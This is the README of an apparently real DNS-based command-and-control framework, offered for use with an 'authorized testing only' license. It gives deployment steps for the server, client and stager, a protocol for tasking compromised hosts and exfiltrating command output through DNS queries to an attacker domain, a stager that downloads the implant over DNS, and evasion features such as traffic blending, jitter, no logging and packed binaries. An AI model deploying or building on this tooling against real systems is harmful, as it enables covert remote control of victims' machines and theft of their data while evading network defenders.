# Unkn0wnC2

DNS-based Command & Control framework operating as an authoritative DNS server with encrypted C2 communications.

![Unkn0wnC2](assets/unkn0wnc2.png)

---

## Quick Deployment

### 1. Domain Setup
Configure NS records at registrar:
```
ns1.yourdomain.net  →  YOUR_SERVER_IP
ns2.yourdomain.net  →  YOUR_SERVER_IP
```
Add glue records at registrar, verify: `dig @8.8.8.8 NS yourdomain.net`

### 2. Build
```bash
# Generate unique encryption key
openssl rand -base64 32

# Edit build_config.json - set encryption_key, domain, server IPs
vim build_config.json

# Build all components
chmod +x build.sh
./build.sh
```

### 3. Deploy Server
```bash
# Copy and configure
sudo cp build/dns-server-linux /opt/unkn0wnc2/
sudo cp Server/config.json /opt/unkn0wnc2/
cd /opt/unkn0wnc2
vim config.json  # Set encryption_key, domain, bind_addr

# Run (requires root for port 53)
sudo ./dns-server-linux
```

### 4. Deploy Client
**Option A - Direct:** `./dns-client-linux`  
**Option B - Stager:** `./stager-linux-x64` (downloads client via DNS)

**Production:** Change encryption key, disable debug mode, use system DNS (stealth)

---

## Protocol Architecture

### Communication Flow
```
Client → System DNS → Internet DNS Chain → Your Authoritative NS (C2 Server)
                                                    ↓
                                    Process C2 / Forward Legitimate DNS
```

### Message Format (Encrypted + Base36 Encoded)
```
<base36(aes-gcm(<message>))>.<timestamp>.<domain>
```

**Beacon Check-in:**
```
Query:    CHK|beaconID|hostname|user|os
Response: ACK  or  TASK|taskID|command
```

**Small Result (<50 bytes):**
```
Query:    RESULT|beaconID|taskID|output
Response: ACK
```

**Large Result (>50 bytes, two-phase):**
```
Phase 1:  RESULT_META|beaconID|taskID|size|chunks → ACK
Phase 2:  DATA|beaconID|taskID|index|chunk (×N)   → ACK
```

**Stager (Base36 only, no encryption):**
```
STG|IP|OS|ARCH         → META|totalChunks
ACK|chunkIndex|IP|HOST → CHUNK|base64Data (×N)
```

### Encoding Pipeline

**Client Traffic:**
```
Plaintext → AES-GCM Encrypt → Base36 Encode → DNS Labels (62 chars) → TXT Query
```

**Stager Traffic:**
```
Plaintext → Base36 Encode → DNS Labels → TXT Query
```

### DNS Label Structure
- **Max length:** 62 characters per label (RFC compliance)
- **Characters:** 0-9, a-z (Base36 alphabet)
- **Cache busting:** Unix timestamp subdomain prevents resolver caching
- **Example:** `a1b2c3...xyz.1729123456.secwolf.net`

---

## Statistics & Configuration

### Server Specs
| Component | Value |
|-----------|-------|
| Port | UDP/53 |
| Encryption | AES-GCM + Base36 |
| Max chunk size | 403 bytes (tested maximum) |
| Session timeout | 3 hours inactivity |
| Cleanup interval | 5 minutes |
| DNS forwarding | Enabled (8.8.8.8) |

### Stager Specs
| Component | Value |
|-----------|-------|
| Binary size | ~30 KB |
| Encoding | Base36 only |
| Chunk size | 403 bytes |
| Jitter | 100-500ms |
| Burst control | 10 chunks → 2s pause |
| Download time | ~27-54 min (4MB client) |

### Client Specs
| Component | Value |
|-----------|-------|
| Binary size (stripped) | ~2.5 MB |
| Binary size (UPX) | ~1 MB |
| Encryption | AES-GCM |
| Encoding | Base36 |
| Check-in interval | 5-15s (configurable) |
| DNS server | System default (configurable) |

### Build Output
```
build/
├── dns-server-linux
├── dns-client-linux
├── dns-client-windows.exe
├── deployment_info.json
└── stager/
    ├── stager-linux-x64
    └── stager-windows-x64.exe
```

---

## C2 Console Commands

```
beacons              List all active beacons
task <id> <cmd>      Queue command for beacon
tasks                Show all tasks and status
result <task_id>     Display task output
logs                 Show log message count
status               Server status summary
clear                Clear console
exit                 Shutdown server
```

**Example Session:**
```bash
c2> beacons
ID    Hostname    Username    OS       Last Seen
a1b2  target-01   admin       Linux    2s ago

c2> task a1b2 whoami
[+] Task T1001 queued for beacon a1b2

c2> tasks
ID     Beacon  Command  Status     Created
T1001  a1b2    whoami   completed  5s ago

c2> result T1001
admin
```

---

## Protocol Details

### Cache-Busting Mechanism
Every query includes Unix timestamp subdomain:
```
<data>.1729123456.secwolf.net
<data>.1729123461.secwolf.net  ← Different subdomain = no cache
```

### Two-Phase Result Exfiltration
**Why?** Large outputs exceed DNS packet limits

**Phase 1 - Metadata:**
```
RESULT_META|beaconID|taskID|totalSize|chunkCount
```

**Phase 2 - Data Chunks:**
```
DATA|beaconID|taskID|1|chunk1
DATA|beaconID|taskID|2|chunk2
... (server reassembles automatically)
```

### Traffic Blending
```
Non-C2 query:     www.secwolf.net
Detection:        Not Base36-encoded
Action:           Forward to 8.8.8.8
Result:           Legitimate DNS response
                  ↓
                  Server appears as normal authoritative NS
```

### Session Management
| Session Type | Timeout | Cleanup |
|-------------|---------|---------|
| Stager downloads | 3 hours inactivity | Auto-delete on expire |
| Expected results | 1 hour | Auto-delete on expire |
| Cleanup ticker | 5 minutes | Background goroutine |

---

## Security Features

### OPSEC
- ✅ Clients/stagers have zero logging in production
- ✅ Server logs only essential events (debug mode available)
- ✅ Encryption key warning on startup if using default
- ✅ Stripped binaries (no debug symbols)
- ✅ System DNS usage for traffic blending

### Encryption
- **Algorithm:** AES-GCM (authenticated encryption)
- **Key derivation:** SHA256 hash of passphrase
- **Encoding:** Base36 (DNS-safe: 0-9, a-z)
- **Key matching:** Server and clients must use identical key

### Stealth
- DNS cache busting (timestamp subdomains)
- Legitimate query forwarding (traffic blending)
- Random check-in intervals (jitter)
- Base36 appears as random subdomain patterns
- System DNS resolver usage (blends with normal traffic)

---

## Troubleshooting

**Server won't start (permission denied):**
```bash
# Port 53 requires root
sudo ./dns-server-linux

# Or use capability
sudo setcap CAP_NET_BIND_SERVICE=+eip ./dns-server-linux
```

**Client not checking in:**
```bash
# Verify encryption key matches server
# Check DNS delegation
dig @8.8.8.8 NS yourdomain.net

# Should return ns1/ns2.yourdomain.net pointing to YOUR_SERVER_IP
```

**Stager "No answers" errors:**
```bash
# DNS packet too large (reduce chunk size if needed)
# Current: 403 bytes (tested maximum through Google DNS)
# Edit Stager/stager.c: #define CHUNK_SIZE 300
```

**Session expiration mid-download:**
```bash
# Fixed in current version (3-hour timeout with activity tracking)
# Rebuild server if using old version
```

---

## Production Checklist

- [ ] Change encryption key from default
- [ ] Disable debug mode (`debug: false`)
- [ ] Configure domain and NS records
- [ ] Add registrar glue records
- [ ] Set proper bind address
- [ ] Copy client binary to `build/` (for stager)
- [ ] Test in isolated environment
- [ ] Verify DNS delegation working

---

## Build Configuration

**`build_config.json` structure:**
```json
{
  "server": {
    "bind_addr": "172.26.13.62",
    "server_address": "98.90.218.70",
    "domain": "secwolf.net",
    "debug": false
  },
  "client": {
    "server_domain": "secwolf.net",
    "dns_server": "",
    "sleep_min": 5,
    "sleep_max": 15
  },
  "security": {
    "encryption_key": "CHANGE_THIS_RANDOM_32CHAR_KEY"
  }
}
```

**Key fields:**
- `bind_addr`: Server's internal/external IP
- `server_address`: Public IP for DNS delegation
- `domain`: Your registered domain
- `dns_server`: Leave empty for system DNS (stealth), or set specific DNS
- `sleep_min/max`: Beacon check-in interval (seconds)
- `encryption_key`: **MUST MATCH** between server and clients

---

**Version:** 0.1.0  
**License:** Use for authorized security testing only  
**Warning:** Ensure proper authorization before deployment
